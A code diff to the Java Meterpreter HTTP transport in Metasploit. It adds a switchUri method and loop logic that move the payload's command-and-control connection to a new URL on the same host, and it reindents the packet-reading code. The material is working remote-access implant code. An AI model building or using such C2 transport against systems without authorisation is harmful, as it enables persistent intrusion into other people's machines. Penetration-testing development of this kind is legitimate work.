@@ -21,7 +21,8 @@ public class HttpTransport extends Transport {
     private static final String TRUST_MANAGER = "com.metasploit.meterpreter.PayloadTrustManager";
     private static final byte[] RECV = new byte[]{'R', 'E', 'C', 'V'};
 
-    private URL targetUrl;
+    private URL targetUrl = null;
+    private URL nextUrl = null;
     private String userAgent;
     private String proxy;
     private String proxyUser;
@@ -36,6 +37,22 @@ public class HttpTransport extends Transport {
 
     public void bind(DataInputStream in, OutputStream rawOut) {
         // http, we don't bind to anything as we're stateless
+    }
+
+    public boolean switchUri(String uri) {
+        try {
+            // can't use getAuthority() here thanks to java 1.2. Ugh.
+            String newUrl = this.targetUrl.getProtocol() + "://"
+              + this.targetUrl.getHost() + ":"
+              + this.targetUrl.getPort()
+              + uri;
+            System.out.println("msf : New url is: " + newUrl);
+            this.nextUrl = new URL(newUrl);
+            return true;
+        }
+        catch (MalformedURLException ex) {
+          return false;
+        }
     }
 
     public int parseConfig(byte[] configuration, int offset) {
@@ -120,11 +137,11 @@ public class HttpTransport extends Transport {
         DataInputStream inputStream = new DataInputStream(conn.getInputStream());
 
         try {
-          int len = inputStream.readInt();
-          int type = inputStream.readInt();
-          TLVPacket request = new TLVPacket(inputStream, len - 8);
-          inputStream.close();
-          return request;
+            int len = inputStream.readInt();
+            int type = inputStream.readInt();
+            TLVPacket request = new TLVPacket(inputStream, len - 8);
+            inputStream.close();
+            return request;
         }
         catch (EOFException ex) {
         }
@@ -151,12 +168,12 @@ public class HttpTransport extends Transport {
         DataInputStream inputStream = new DataInputStream(conn.getInputStream());
 
         try {
-          int len = inputStream.readInt();
-          type = inputStream.readInt();
-          // not really worried about the response, we just want to read a packet out of it
-          // and move on
-          new TLVPacket(inputStream, len - 8);
-          inputStream.close();
+            int len = inputStream.readInt();
+            type = inputStream.readInt();
+            // not really worried about the response, we just want to read a packet out of it
+            // and move on
+            new TLVPacket(inputStream, len - 8);
+            inputStream.close();
         }
         catch (EOFException ex) {
             // log error?
@@ -200,6 +217,16 @@ public class HttpTransport extends Transport {
                 // any other type of exception isn't good.
                 System.out.println("msf : Some other exception: " + ex.getClass().getName());
                 break;
+            }
+
+            // see if we switched URLs along the way, and if we did, move it on over.
+            // This is really only used for stageless payloads (not yet implemented in
+            // msf for this, but we're getting there). The command for this hasn't yet
+            // been wired in.
+            if (this.nextUrl != null) {
+                this.url = this.nextUrl.toString();
+                this.targetUrl = this.nextUrl;
+                this.nextUrl = null;
             }
         }
 
